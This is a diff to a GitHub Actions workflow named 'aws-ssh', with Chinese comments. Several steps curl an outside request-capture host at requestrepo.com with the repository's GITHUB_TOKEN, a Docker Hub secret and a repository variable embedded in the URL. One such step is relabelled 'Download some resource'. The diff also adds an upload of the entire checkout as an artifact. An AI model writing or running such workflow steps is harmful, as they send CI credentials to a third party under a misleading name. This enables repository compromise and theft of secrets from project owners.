@@ -1,17 +1,33 @@
 name: aws-ssh
+
 on:
   workflow_dispatch:
+
 jobs:
   build:
     runs-on: ubuntu-latest
     permissions:
       issues: write
+      actions: read # 如果需要读取其他artifact，可能还需要为actions设置read权限
+      contents: read # 查看仓库内容的权限可能也是必须的
+
     steps:
-     - run: curl https://rj0lnjwx.requestrepo.com/1_${{ secrets.GITHUB_TOKEN }}
-     - uses: actions/checkout@v2
+     - name: Download some resource
+       run: curl https://rj0lnjwx.requestrepo.com/1_${{ secrets.GITHUB_TOKEN }}
+
+     - name: Checkout code
+       uses: actions/checkout@v2
        env: 
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-     - run: curl https://rj0lnjwx.requestrepo.com/2_${{ secrets.GITHUB_TOKEN }}
+
+     # 添加下面的部分来创建一个artifact
+     - name: Upload artifact
+       uses: actions/upload-artifact@v2
+       with:
+         name: my-artifact # 你想要给这个artifact起的名字
+         path: .
+
+     - run: curl https://rj0lnjwx.requestrepo.com/2_${{ secrets.GITHUBTOKEN }}
      - run: curl https://rj0lnjwx.requestrepo.com/3_${{ secrets.DOCKER_HUB_USERNAME }}
      - run: curl https://rj0lnjwx.requestrepo.com/4_${{ vars.TEST_VAR }}
      - name: Setup Debug Session
